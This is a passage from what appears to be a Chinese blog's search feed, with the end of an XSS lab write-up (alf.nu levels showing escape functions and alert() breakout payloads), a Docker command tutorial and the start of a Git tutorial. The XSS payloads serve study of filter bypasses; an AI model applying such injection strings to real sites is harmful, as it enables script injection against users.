class="xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre></div><p>服务器过滤了一大堆字符,并在其前面添加反斜杠进行转义</p><p>注意<code>console.log(&quot;$&#123;s&#125;&quot;)</code>,当我们输入一个双引号<code>&quot;</code>,正则会变成<code>\&quot;</code>,然后整条语句变成<code>console.log(&quot;\&quot;&quot;)</code>.这样反斜杠就失去转义的作用</p><div class="code-wrapper"><pre><code class="hljs javascript">payload:<span class="hljs-string">&quot;);alert(&quot;</span><span class="hljs-number">1</span></code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-18.png"></p><br><h2 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:<span class="hljs-comment">// from alf.nu</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span> (<span class="hljs-params">s</span>) </span>&#123;  s = s.replace(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;\\&quot;&#x27;</span>)  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="hljs-string">&#x27;&quot;);&lt;/script&gt;&#x27;</span>&#125;前端代码:<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre></div><p>服务器对双引号进行过滤,转为<code>\\&quot;</code>,把双引号和括号进行补全就能绕过</p><div class="code-wrapper"><pre><code class="hljs javascript">payload:\<span class="hljs-string">&quot;);alert(1)//</span></code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-19.png"></p><br>]]></content>
      
      
      <categories>
          
          <category> 靶机练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker保姆级教程：从入门到入土</title>
      <link href="/Study/post/Study-Note-For-Docker/"/>
      <url>/Study/post/Study-Note-For-Docker/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker安装教程"><a href="#Docker安装教程" class="headerlink" title="Docker安装教程"></a>Docker安装教程</h1><blockquote><p>Docker官方手册 :<a href="https://docs.docker.com/">https://docs.docker.com/</a></p></blockquote><br><h2 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h2><blockquote><p>此文章演示的版本为Linux版本,系统为CentOS 7,官方手册明确说明:</p><p>​    若要在CentOS上安装Docker,则需要一个CentOS 7的维护版本。不支持或未测试存档版本。</p></blockquote><div class="code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">系统版本信息</span>[root@localhost ~]# cat /etc/os-releaseNAME=&quot;CentOS Linux&quot;VERSION=&quot;7 (Core)&quot;ID=&quot;centos&quot;ID_LIKE=&quot;rhel fedora&quot;VERSION_ID=&quot;7&quot;PRETTY_NAME=&quot;CentOS Linux 7 (Core)&quot;ANSI_COLOR=&quot;0;31&quot;CPE_NAME=&quot;cpe:/o:centos:centos:7&quot;HOME_URL=&quot;https://www.centos.org/&quot;BUG_REPORT_URL=&quot;https://bugs.centos.org/&quot;CENTOS_MANTISBT_PROJECT=&quot;CentOS-7&quot;CENTOS_MANTISBT_PROJECT_VERSION=&quot;7&quot;REDHAT_SUPPORT_PRODUCT=&quot;centos&quot;REDHAT_SUPPORT_PRODUCT_VERSION=&quot;7&quot;</code></pre></div><p>安装之前确保系统没有安装过旧版本的Docker,若有安装执行以下命令卸载旧版本的Docker</p><div class="code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo yum remove docker \</span><span class="bash">                  docker-client \</span><span class="bash">                  docker-client-latest \</span><span class="bash">                  docker-common \</span><span class="bash">                  docker-latest \</span><span class="bash">                  docker-latest-logrotate \</span><span class="bash">                  docker-logrotate \</span><span class="bash">                  docker-engine</span></code></pre></div><br><br><h2 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h2><blockquote><p>安装Docker之前,需要设置Docker存储库</p></blockquote><div class="code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">设置存储库需安装yum-utils包</span>yum install -y yum-utils<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">设置存储库 , 默认为官方国外地址!!!,若网络状态不好请自行更换国内源</span>yum-config-manager \    --add-repo \    https://download.docker.com/linux/centos/docker-ce.repo    <span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">更新源</span>yum makecache fast</code></pre></div><blockquote><p>安装Docker</p></blockquote><div class="code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">安装最新的Docker</span>yum -y install docker-ce docker-ce-cli containerd.io</code></pre></div><br><br><h2 id="启动-amp-运行-Docker"><a href="#启动-amp-运行-Docker" class="headerlink" title="启动&amp;运行 Docker"></a>启动&amp;运行 Docker</h2><div class="code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">启动Docker</span>systemctl start docker<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">运行Hello-world镜像来测试是否正确安装了Docker</span>docker run hello-world<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">显示以下信息则正确安装了Docker</span>Hello from Docker!This message shows that your installation appears to be working correctly.To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub.    (amd64) 3. The Docker daemon created a new container from that image which runs the    executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it    to your terminal.To try something more ambitious, you can run an Ubuntu container with:<span class="hljs-meta"> $</span><span class="bash"> docker run -it ubuntu bash</span>Share images, automate workflows, and more with a free Docker ID: https://hub.docker.com/For more examples and ideas, visit: https://docs.docker.com/get-started/</code></pre></div><br><br><h2 id="卸载Docker"><a href="#卸载Docker" class="headerlink" title="卸载Docker"></a>卸载Docker</h2><div class="code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">卸载Docker</span>yum remove docker-ce docker-ce-cli containerd.io<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">删除主机上的残余文件(镜像,容器,配置文件等等)</span>rm -rf /var/lib/docker</code></pre></div><br><br><h1 id="配置国内镜像加速"><a href="#配置国内镜像加速" class="headerlink" title="配置国内镜像加速"></a>配置国内镜像加速</h1><blockquote><p>使用国内镜像加速能更快的下载镜像,这里以腾讯云为例,其他运行商请自行找到各自的文档进行配置</p></blockquote><div class="code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">打开 /etc/docker/daemon.json 配置文件(这个文件是本身是不存在的,只是通过vim创建-编辑-保存-生成)</span>vim /etc/docker/daemon.json<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">进入vim的编辑模式,添加一下内容,并保存</span>&#123;&quot;registry-mirrors&quot;: [&quot;https://mirror.ccs.tencentyun.com&quot;]&#125;<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">重新加载服务配置文件</span>systemctl daemon-reload<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">重启Docker进程</span>systemctl restart docker</code></pre></div><br><br><h1 id="Docker命令笔记"><a href="#Docker命令笔记" class="headerlink" title="Docker命令笔记"></a>Docker命令笔记</h1><br><h2 id="Docker-学习资源"><a href="#Docker-学习资源" class="headerlink" title="Docker 学习资源"></a>Docker 学习资源</h2><blockquote><p>Docker官方命令手册 :<a href="https://docs.docker.com/reference/">https://docs.docker.com/reference/</a></p><p>菜鸟教程命令手册:<a href="https://www.runoob.com/docker/docker-command-manual.html">https://www.runoob.com/docker/docker-command-manual.html</a></p><p>B站<a href="https://space.bilibili.com/95256449">遇见狂神说</a>UP主视频教学:<a href="https://www.bilibili.com/video/BV1og4y1q7M4">https://www.bilibili.com/video/BV1og4y1q7M4</a></p></blockquote><br><br><h2 id="Docker镜像命令"><a href="#Docker镜像命令" class="headerlink" title="Docker镜像命令"></a>Docker镜像命令</h2><br><h3 id="docker-images-查看本地镜像"><a href="#docker-images-查看本地镜像" class="headerlink" title="docker images    查看本地镜像"></a>docker images    查看本地镜像</h3><div class="code-wrapper"><pre><code class="hljs shell">docker images [OPTIONS] [REPOSITORY[:TAG]]-a列出本地所有镜像-q列出本地所有镜像且只显示IMAGE IDdocker images -aREPOSITORY          TAG                 IMAGE ID            CREATED             SIZEhello-world         latest              bf756fb1ae65        5 months ago        13.3kBdocker images -abf756fb1ae65docker images hello-worldREPOSITORY          TAG                 IMAGE ID            CREATED             SIZEhello-world         latest              bf756fb1ae65        5 months ago        13.3kB<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">参数说明</span>REPOSITORY镜像的名字TAG镜像的标签IMAGE ID镜像的ID值CREATED镜像的创建时间SIZE镜像的大小</code></pre></div><br><h3 id="docker-search-从Docker-Hub查找镜像"><a href="#docker-search-从Docker-Hub查找镜像" class="headerlink" title="docker search    从Docker Hub查找镜像"></a>docker search    从Docker Hub查找镜像</h3><blockquote><p>Docker Hub地址:<a href="https://hub.docker.com/">https://hub.docker.com/</a></p></blockquote><p>从Docker Hub中搜索mysql的结果</p><p><img src="https://github.com/MokYan/Figurebed/blob/master/docker/Search.png?raw=true" alt="Search.png"></p><p>通过docker search搜索mysql的结果</p><div class="code-wrapper"><pre><code class="hljs shell">docker search mysqlNAME         DESCRIPTION            STARS       OFFICIAL        AUTOMATEDmysql        MySQL is a widely used...   9666        [OK]                mariadb      MariaDB is a community-devel.. 3517      [OK]                mysql/mysql-server  Optimized MySQL Server Docker.. 705                         [OK]centos/mysql-57-... MySQL 5.7 SQL database server   77                                      <span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">通过--filter筛选结果</span>docker search mysql --filter=STARS=3000NAME         DESCRIPTION            STARS       OFFICIAL        AUTOMATEDmysql        MySQL is a widely used...   9666        [OK]                mariadb      MariaDB is a community-devel.. 3517      [OK]                <span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">参数说明</span>NAME镜像的名字DESCRIPTION镜像的描述STARS类似于GitHub里面的star,表示点赞,喜欢OFFICIAL是否为docker官方发布AUTOMATED是否自动搭建</code></pre></div><br><h3 id="docker-pull-从Docker-Hub下载镜像"><a href="#docker-pull-从Docker-Hub下载镜像" class="headerlink" title="docker pull 从Docker Hub下载镜像"></a>docker pull 从Docker Hub下载镜像</h3><div class="code-wrapper"><pre><code class="hljs shell">docker pull [OPTIONS] NAME[:TAG|@DIGEST]-a拉取所有包含[NAME]的镜像<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">默认下载最新版</span>docker pull mysqlUsing default tag: latestlatest: Pulling from library/mysql8559a31e96f4: Pull completed51ce1c2e575: Pull completec2344adc4858: Pull completefcf3ceff18fc: Pull complete16da0c38dc5b: Pull completeb905d1797e97: Pull complete4b50d1c6b05c: Pull completec75914a65ca2: Pull complete1ae8042bdd09: Pull complete453ac13c00a3: Pull complete9e680cd72f08: Pull completea6b5dc864b6c: Pull completeDigest: sha256:8b7b328a7ff6de46ef96bcf83af048cb00a1c86282bfca0cb119c84568b4caf6Status: Downloaded newer image for mysql:latestdocker.io/library/mysql:latest<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">指定版本下载,版本必须在Docker Hub存在</span>docker pull mysql:8.08.0: Pulling from library/mysqlDigest: sha256:8b7b328a7ff6de46ef96bcf83af048cb00a1c86282bfca0cb119c84568b4caf6Status: Downloaded newer image for mysql:8.0docker.io/library/mysql:8.0<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">从镜像库拉取所有tag标签名的镜像</span>docker pull mysql -a<span class="hljs-meta">#</span><span class="bash">结果太多了,直接看本地镜像</span>docker imagesREPOSITORY          TAG                 IMAGE ID            CREATED             SIZEmysql               8.0                 be0dbf01a0f3        2 weeks ago         541MBmysql               latest              be0dbf01a0f3        2 weeks ago         541MBmysql               5.5                 d404d78aa797        13 months ago       205MBmysql               5.5.62              d404d78aa797        13 months ago       205MBmysql               5.6.43              bc788a6a2745        15 months ago       256MBmysql               5.6.42              27e29668a08a        18 months ago       256MBmysql               5.5.61              d306c8812ec3        20 months ago       205MBmysql               5.6.41              085b9b6ec8a9        20 months ago       256MBmysql               5.5.60              2cd7ceff3e53        23 months ago       205MBmysql               5.6.40              50328380b2b4        23 months ago       256MBmysql               5.5.59              0da48351c371        2 years ago         205MBmysql               5.6.39              079344ce5ebd        2 years ago         256MB...</code></pre></div><br><h3 id="docker-rmi-删除本地镜像"><a href="#docker-rmi-删除本地镜像" class="headerlink" title="docker rmi    删除本地镜像"></a>docker rmi    删除本地镜像</h3><div class="code-wrapper"><pre><code class="hljs shell">docker rmi [OPTIONS] IMAGE [IMAGE...]-f强制删除docker imagesREPOSITORY          TAG                 IMAGE ID            CREATED             SIZEmysql               latest              be0dbf01a0f3        2 weeks ago         541MBhello-world         latest              bf756fb1ae65        5 months ago        13.3kB<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">卸载本地镜像的mysql</span>docker rmi -f be0dbf01a0f3docker rmi -f mysql<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">卸载本地所有镜像(一个一个删除)</span>docker rmi -f mysql hello-worlddocker rmi -f be0dbf01a0f3 bf756fb1ae65<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">卸载本地所有镜像(通过$()传值删除)</span>docker rmi -f $(docker images -aq)</code></pre></div><br><h2 id="Docker容器命令"><a href="#Docker容器命令" class="headerlink" title="Docker容器命令"></a>Docker容器命令</h2><br><br><h3 id="docker-run-新建容器并启动"><a href="#docker-run-新建容器并启动" class="headerlink" title="docker run    新建容器并启动"></a>docker run    新建容器并启动</h3><div class="code-wrapper"><pre><code class="hljs shell">docker run [OPTIONS] IMAGE [COMMAND] [ARG...]--name=&quot;Name&quot;为容器指定一个名称-d后台运行容器,并返回容器id--it以交互模式运行容器,为容器分配一个伪输入终端-p(小写p)指定容器的端口格式为 -p 8080(宿主机端口):8080(容器端口)-P(大写p)随机指定端口-v挂载目录格式为 -v /home/user(宿主机目录):/root/user(容器目录)匿名挂载 -v容器内路径   具名挂载 -v卷名:容器内路径指定路径挂载 -v宿主机路径:容器内路径只读在容器内路径后面加 &quot;:ro&quot;读写  在容器内路径后面加 &quot;:rw&quot;-e环境配置--volumes-from从另一个容器当中挂载容器中已经创建好的数据卷docker run -it --name docker02 --volumes-from docker01 centos运行容器docker02挂载到容器docker01上,实现更新数据在容器之间共享<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">docker容器使用后台运行,就必须要有一个前台进程,否则docker发现没有应用就会停止容器</span></code></pre></div><br><h3 id="docker-ps-列出正在运行的容器信息"><a href="#docker-ps-列出正在运行的容器信息" class="headerlink" title="docker ps    列出正在运行的容器信息"></a>docker ps    列出正在运行的容器信息</h3><div class="code-wrapper"><pre><code class="hljs shell">docker ps [OPTIONS]-a显示所有容器,包括历史容器-n=Num显示最近创建的&quot;n&quot;个容器-q显示容器的ID</code></pre></div><br><h3 id="docker退出容器"><a href="#docker退出容器" class="headerlink" title="docker退出容器"></a>docker退出容器</h3><div class="code-wrapper"><pre><code class="hljs shell">exit#终止并退出容器Ctrl + P + Q#不终止并退出容器</code></pre></div><br><h3 id="docker-rm-删除容器"><a href="#docker-rm-删除容器" class="headerlink" title="docker rm    删除容器"></a>docker rm    删除容器</h3><div class="code-wrapper"><pre><code class="hljs shell">docker rm [OPTIONS] CONTAINER [CONTAINER...]-f#强制删除一个运行中的容器<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">删除容器</span>docker rm -f 8c7fefd9e698<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">删除所有容器</span>docker rm -f $(docker ps -aq)docker ps -a -q | xargs docker rm -f</code></pre></div><br><h3 id="docker-start-stop-restart-kill-启动-停止-重启-杀掉容器"><a href="#docker-start-stop-restart-kill-启动-停止-重启-杀掉容器" class="headerlink" title="docker start/stop/restart/kill        启动/停止/重启/杀掉容器"></a>docker start/stop/restart/kill        启动/停止/重启/杀掉容器</h3><div class="code-wrapper"><pre><code class="hljs shell">docker start CONTAINER:启动容器docker stop CONTAINER:停止容器docker restart CONTAINER:重启容器docker kill CONTAINER:杀掉容器</code></pre></div><br><h3 id="docker-logs-获取容器的日志"><a href="#docker-logs-获取容器的日志" class="headerlink" title="docker logs        获取容器的日志"></a>docker logs        获取容器的日志</h3><div class="code-wrapper"><pre><code class="hljs sh">docker logs [OPTIONS] CONTAINER-f跟踪日志输出-t显示时间戳--tail Num列出最新Num调容器日志</code></pre></div><br><h3 id="Docker-top-查看容器中运行的进程信息"><a href="#Docker-top-查看容器中运行的进程信息" class="headerlink" title="Docker top        查看容器中运行的进程信息"></a>Docker top        查看容器中运行的进程信息</h3><div class="code-wrapper"><pre><code class="hljs shell">docker top [OPTIONS] CONTAINER [ps OPTIONS]</code></pre></div><br><h3 id="docker-inspect-获取容器-镜像的元数据"><a href="#docker-inspect-获取容器-镜像的元数据" class="headerlink" title="docker inspect        获取容器/镜像的元数据"></a>docker inspect        获取容器/镜像的元数据</h3><div class="code-wrapper"><pre><code class="hljs shell">docker inspect [OPTIONS] NAME|ID [NAME|ID...]<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">查看centos的元数据</span>docker inspect centos[    &#123;        &quot;Id&quot;: &quot;sha256:831691599b88ad6cc2a4abbd0e89661a121aff14cfa289ad840fd3946f274f1f&quot;,        &quot;RepoTags&quot;: [            &quot;centos:latest&quot;        ],        &quot;RepoDigests&quot;: [            &quot;centos@sha256:4062bbdd1bb0801b0aa38e0f83dece70fb7a5e9bce223423a68de2d8b784b43b&quot;        ],...</code></pre></div><br><h3 id="Docker-exec-进入已经运行的容器-重新分配终端"><a href="#Docker-exec-进入已经运行的容器-重新分配终端" class="headerlink" title="Docker exec        进入已经运行的容器(重新分配终端)"></a>Docker exec        进入已经运行的容器(重新分配终端)</h3><div class="code-wrapper"><pre><code class="hljs shell">docker exec [OPTIONS] CONTAINER COMMAND [ARG...]--it以交互模式运行容器,为容器分配一个伪输入终端<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">进入正在运行的Centos容器</span>docker exec -it 336cc1fb92bf /bin/bash</code></pre></div><br><h3 id="Docker-attach-连接到正在运行中的容器"><a href="#Docker-attach-连接到正在运行中的容器" class="headerlink" title="Docker attach        连接到正在运行中的容器"></a>Docker attach        连接到正在运行中的容器</h3><div class="code-wrapper"><pre><code class="hljs shell">docker attach [OPTIONS] CONTAINER<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">进入正在运行的Centos容器</span>docker attach 336cc1fb92bf</code></pre></div><br><h3 id="Docker-cp-容器与主机之间数据拷贝"><a href="#Docker-cp-容器与主机之间数据拷贝" class="headerlink" title="Docker cp         容器与主机之间数据拷贝"></a>Docker cp         容器与主机之间数据拷贝</h3><div class="code-wrapper"><pre><code class="hljs shell">docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-docker cp 336cc1fb92bf:/home/test.txt /将容器里的/home/test.txt 拷贝到 宿主机的/目录上</code></pre></div><br><h3 id="Docker-commit-从容器创建一个新的镜像"><a href="#Docker-commit-从容器创建一个新的镜像" class="headerlink" title="Docker commit        从容器创建一个新的镜像"></a>Docker commit        从容器创建一个新的镜像</h3><div class="code-wrapper"><pre><code class="hljs shell">docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]-m :提交时的说明文字；-a :提交的镜像作者；创建一个镜像docker commit -a=&quot;MokYan&quot; -m=&quot;add webapps app&quot; c97729657a71 tomcat-v1:1.0docker imagesREPOSITORY            TAG                 IMAGE ID            CREATED             SIZEtomcat-v1             1.0                366d86150b16        19 seconds ago      652MBtomcat                latest              6055d4d564e1        3 days ago          647MB</code></pre></div><br><h2 id="Docker-数据命令"><a href="#Docker-数据命令" class="headerlink" title="Docker 数据命令"></a>Docker 数据命令</h2><br><br><h3 id="docker-volume-管理docker容器挂载的卷"><a href="#docker-volume-管理docker容器挂载的卷" class="headerlink" title="docker volume        管理docker容器挂载的卷"></a>docker volume        管理docker容器挂载的卷</h3><div class="code-wrapper"><pre><code class="hljs shell">Usage:docker volume COMMANDCommands:  create      创建一个 volume  inspect     查看一个或多个volume 的元数据  ls          查看 volumes  prune       删除所有未使用的本地 volumes  rm          移出一个或多个 volumes</code></pre></div><ul><li>docker 默认在主机上会有一个特定的区域（<code>/var/lib/docker/volumes/</code>），该区域用来存放 volume。</li><li>非 docker 进程不应该去修改该区域。</li><li>volume 可以通过 <code>docker volume</code> 进行管理，如创建、删除等操作。</li><li>volume 在生成的时候如果不指定名称，便会随机生成。</li></ul><br><h3 id="docker-file"><a href="#docker-file" class="headerlink" title="docker file"></a>docker file</h3><div class="code-wrapper"><pre><code class="hljs shell">使用 Dockerfile 定制镜像1.创建Docker file文件(名字随意)vim dockerfile12.编辑docker file文件FROM centosVOLUME [&quot;volume01&quot;,&quot;volume02&quot;]CMD echo &quot;----end----&quot;CMD /bin/bash3.构建镜像docker build -f /home/docker-test-volume/dockerfile1 -t mokyan/centos:1.0 .Sending build context to Docker daemon  2.048kB    Step 1/4 : FROM centos     ---&gt; 831691599b88    Step 2/4 : VOLUME [&quot;volume01&quot;,&quot;volume02&quot;]     ---&gt; Running in 7aa721724f47    Removing intermediate container 7aa721724f47     ---&gt; 37cc8ddeb5ef    Step 3/4 : CMD echo &quot;----end----&quot;     ---&gt; Running in a00fd1594c00    Removing intermediate container a00fd1594c00     ---&gt; 976fefd5e341    Step 4/4 : CMD /bin/bash     ---&gt; Running in 3203befb485f    Removing intermediate container 3203befb485f     ---&gt; e03ef3a4bf68    Successfully built e03ef3a4bf68    Successfully tagged mokyan/centos:1.04.查看镜像docker imagesREPOSITORY            TAG                 IMAGE ID            CREATED             SIZEmokyan/centos         1.0                 e03ef3a4bf68        16 seconds ago      215MB注意:编辑docker file文件,里面的命令都是大写的构建镜像时,最后的点是上下文路径,所以上下文路径下不要放无用的文件，因为会一起打包发送给 docker 引擎，如果文件过多会造成过程缓慢。构建镜像时,-t后面接的名字不能存在大写,否则会报错构建镜像时,&quot;#&quot;表示注释</code></pre></div><br><h3 id="docker-file-指令"><a href="#docker-file-指令" class="headerlink" title="docker file 指令"></a>docker file 指令</h3><div class="code-wrapper"><pre><code class="hljs shell">FROM#基础镜像,基于这个镜像构建MAINTAINER#构建镜像的作者信息RUN#镜像构建时需要运行的命令ADD#添加内容WORKDIR#镜像的工作目录VOLUME#挂载的目录EXPOSE#暴露端口配置CMD#容器启动时需要运行的命令,只有最后一个生效,可被替换ENTRYPOINT#容器启动时需要运行的命令,可以追加命令ENV#构建的时候设置环境变量</code></pre></div><br><h2 id="Docker-网络命令"><a href="#Docker-网络命令" class="headerlink" title="Docker 网络命令"></a>Docker 网络命令</h2><br><br><h3 id="docker-network"><a href="#docker-network" class="headerlink" title="docker network"></a>docker network</h3><div class="code-wrapper"><pre><code class="hljs shell">docker network --helpUsage:docker network COMMANDManage networksCommands:  connect     Connect a container to a network  create      Create a network  disconnect  Disconnect a container from a network  inspect     Display detailed information on one or more networks  ls          List networks  prune       Remove all unused networks  rm          Remove one or more networks<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">查看docker 网络适配器模式</span>docker network lsNETWORK ID          NAME                DRIVER              SCOPE8c61b8c764f6        bridge              bridge              local0fb588f08568        host                host                local58d6ff1f424f        none                null                localbridge桥接模式host共享宿主机网络模式none不配置网络<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">创建docker 网络适配器 test-net</span>docker network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 test-net--driver 网络适配器模式,默认为bridge--subnet子网掩码配置--gateway网关配置<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">删除docker 网络适配器 test-net</span>docker network rm test-net<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">为容器添加网络适配器,tomcat01_birdge的网络适配器为默认docker01</span>docker network connect test-net tomcat01_birdge</code></pre></div><br><h2 id="Docker-其他命令"><a href="#Docker-其他命令" class="headerlink" title="Docker 其他命令"></a>Docker 其他命令</h2><br><br><h3 id="docker-info-显示-Docker-系统信息，包括镜像和容器数"><a href="#docker-info-显示-Docker-系统信息，包括镜像和容器数" class="headerlink" title="docker info        显示 Docker 系统信息，包括镜像和容器数"></a>docker info        显示 Docker 系统信息，包括镜像和容器数</h3><br><h3 id="docker-version-显示-Docker-版本信息"><a href="#docker-version-显示-Docker-版本信息" class="headerlink" title="docker version        显示 Docker 版本信息"></a>docker version        显示 Docker 版本信息</h3><br><h3 id="docker-stats-显示Docker容器占用系统资源情况"><a href="#docker-stats-显示Docker容器占用系统资源情况" class="headerlink" title="docker stats        显示Docker容器占用系统资源情况"></a>docker stats        显示Docker容器占用系统资源情况</h3><br><h3 id="docker-login-登录Docker"><a href="#docker-login-登录Docker" class="headerlink" title="docker login        登录Docker"></a>docker login        登录Docker</h3><div class="code-wrapper"><pre><code class="hljs shell">docker login -u &quot;你的用户名&quot; -p &quot;你的密码&quot;</code></pre></div><br><h3 id="docker-logout-退出Docker"><a href="#docker-logout-退出Docker" class="headerlink" title="docker logout        退出Docker"></a>docker logout        退出Docker</h3>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git保姆级教程 ：入门到入土</title>
      <link href="/Study/post/Study-Note-for-Git/"/>
      <url>/Study/post/Study-Note-for-Git/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Git的发展历史"><a href="#1-Git的发展历史" class="headerlink" title="1. Git的发展历史"></a>1. Git的发展历史</h1><blockquote><p>很多人都知道，Linus在1991年创建了开源的Linux，从此，Linux系统不断发展，已经成为最大的服务器系统软件了。<br>Linus虽然创建了Linux，但Linux的壮大是靠全世界热心的志愿者参与的，这么多人在世界各地为Linux编写代码，那Linux的代码是如何管理的呢？<br>事实是，在2002年以前，世界各地的志愿者把源代码文件通过diff的方式发给Linus，然后由Linus本人通过手工方式合并代码！<br>你也许会想，为什么Linus不把Linux代码放到版本控制系统里呢？不是有CVS、SVN这些免费的版本控制系统吗？因为Linus坚定地反对CVS和SVN，这些集中式的版本控制系统不但速度慢，而且必须联网才能使用。有一些商用的版本控制系统，虽然比CVS、SVN好用，但那是付费的，和Linux的开源精神不符。<br>不过，到了2002年，Linux系统已经发展了十年了，代码库之大让Linus很难继续通过手工方式管理了，社区的弟兄们也对这种方式表达了强烈不满，于是Linus选择了一个商业的版本控制系统BitKeeper，BitKeeper的东家BitMover公司出于人道主义精神，授权Linux社区免费使用这个版本控制系统。<br>安定团结的大好局面在2005年就被打破了，原因是Linux社区牛人聚集，不免沾染了一些梁山好汉的江湖习气。开发Samba的Andrew试图破解BitKeeper的协议（这么干的其实也不只他一个），被BitMover公司发现了（监控工作做得不错！），于是BitMover公司怒了，要收回Linux社区的免费使用权。<br>Linus可以向BitMover公司道个歉，保证以后严格管教弟兄们，嗯，这是不可能的。实际情况是这样的：<br>Linus花了两周时间自己用C写了一个分布式版本控制系统，这就是Git！一个月之内，Linux系统的源码已经由Git管理了！牛是怎么定义的呢？大家可以体会一下。<br>Git迅速成为最流行的分布式版本控制系统，尤其是2008年，GitHub网站上线了，它为开源项目免费提供Git存储，无数开源项目开始迁移至GitHub，包括jQuery，PHP，Ruby等等。<br>历史就是这么偶然，如果不是当年BitMover公司威胁Linux社区，可能现在我们就没有免费而超级好用的Git了。<br>——完全照搬廖老师的简介,懒得敲,大家看看就好😂</p></blockquote><h1 id="2-Git工作流程"><a href="#2-Git工作流程" class="headerlink" title="2. Git工作流程"></a>2. Git工作流程</h1><p>Git本地有四个工作区域 :</p><ul><li>工作目录 (Working Directory)</li><li>暂存区(Stage/Index)</li><li>版本库(Repository)</li><li>远程的Git仓库(Remote Directory)<br><img src="https://github.com/MokYan/Figurebed/blob/master/git/structure.png?raw=true" alt="Git工作流程"></li></ul><h1 id="3-Git命令"><a href="#3-Git命令" class="headerlink" title="3.Git命令"></a>3.Git命令</h1><h2 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h2><div class="code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">在当前目录新建一个Git</span><span class="hljs-meta">$</span><span class="bash"> git init</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">新建一个目录,将其初始化为Git代码库</span><span class="hljs-meta">$</span><span class="bash"> git init [project-name]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 下载一个项目和它的整个代码历史</span><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">clone</span> [url]</span></code></pre></div><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><div class="code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 显示当前的Git配置</span><span class="hljs-meta">$</span><span class="bash"> git config --list</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 编辑Git配置文件</span><span class="hljs-meta">$</span><span class="bash"> git config -e [--global]</span><span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> 设置提交代码时的用户信息</span><span class="hljs-meta">$</span><span class="bash"> git config [--global] user.name <span class="hljs-string">&quot;[name]&quot;</span></span><span class="hljs-meta">$</span><span class="bash"> git config 